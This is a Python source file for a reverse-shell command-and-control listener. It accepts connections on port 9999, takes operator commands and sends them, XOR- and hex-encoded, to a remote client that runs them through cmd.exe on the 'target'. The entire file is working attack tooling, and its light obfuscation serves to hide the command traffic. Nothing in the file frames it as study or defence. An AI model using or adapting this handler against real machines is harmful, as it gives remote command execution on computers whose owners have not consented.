import socket
import threading
import os
import sys

KEY = 0x3A


def xor(data: bytes) -> bytes:
    return bytes([b ^ KEY for b in data])


def hex_encode(data: bytes) -> str:
    return data.hex().upper()


def hex_decode(hex_str: str) -> bytes:
    return bytes.fromhex(hex_str)


def handle_client(conn, addr):
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    try:
        while True:
            try:
                cmd = input("CMD> ")
            except (EOFError, KeyboardInterrupt):
                print("\n[-] Exiting...")
                break

            if not cmd.strip():
                continue

            # Local commands
            if cmd.lower() == "exit":
                encoded = hex_encode(xor(cmd.encode()))
                conn.send(encoded.encode())
                break

            if cmd.lower() in ("clear", "cls"):
                os.system("cls" if os.name == "nt" else "clear")
                continue

            if cmd.lower() == "help":
                print("""
Commands:
  exit              - Disconnect client and exit
  clear/cls         - Clear terminal
  help              - Show this help
  <any cmd>         - Execute on target via cmd.exe
                """)
                continue

            # Send encrypted command
            encoded = hex_encode(xor(cmd.encode()))
            conn.send(encoded.encode())

            # Receive response
            try:
                data = conn.recv(65536)
            except (ConnectionResetError, ConnectionAbortedError):
                print("[-] Connection lost")
                break

            if not data:
                print("[-] Disconnected")
                break

            try:
                raw = data.decode().strip()
                decoded = xor(hex_decode(raw))
                print(decoded.decode(errors='ignore'))
            except Exception as e:
                print(f"[-] Decode error: {e}")
                print(f"    Raw: {data[:200]}...")

    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        conn.close()


def start_server(host='0.0.0.0', port=9999):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    print(f"[+] Listening on {host}:{port}...")
    print(f"    XOR key: 0x{KEY:02X}")

    try:
        while True:
            conn, addr = server.accept()
            t = threading.Thread(target=handle_client, args=(conn, addr))
            t.daemon = True
            t.start()
    except KeyboardInterrupt:
        print("\n[-] Server shutting down...")
    finally:
        server.close()


if __name__ == "__main__":
    start_server()
